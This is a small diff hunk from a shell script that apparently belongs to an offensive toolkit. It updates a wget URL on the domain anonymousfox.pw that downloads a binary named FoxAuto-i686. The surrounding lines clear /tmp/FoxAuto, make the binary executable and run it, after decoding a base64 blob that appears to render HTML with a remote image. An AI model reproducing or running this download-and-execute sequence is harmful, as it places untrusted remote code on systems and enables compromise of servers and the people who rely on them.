@@ -123,6 +123,6 @@ Yz0iaHR0cDovL2QudG9wNHRvcC5uZXQvcF8yNDlhNGlqMS5wbmciPjwvY2VudGVyPgo8L3ByZT4K
 CjxkaXYgYWxpZ249ImNlbnRlciI+' | base64 -d
 
 rm -rf /tmp/FoxAuto
-wget https://anonymousfox.pw/local/FoxAuto/FoxAuto-i686
+wget https://anonymousfox.pw/_@files/local/FoxAuto-i686
 chmod +x FoxAuto-i686
 ./FoxAuto-i686 0
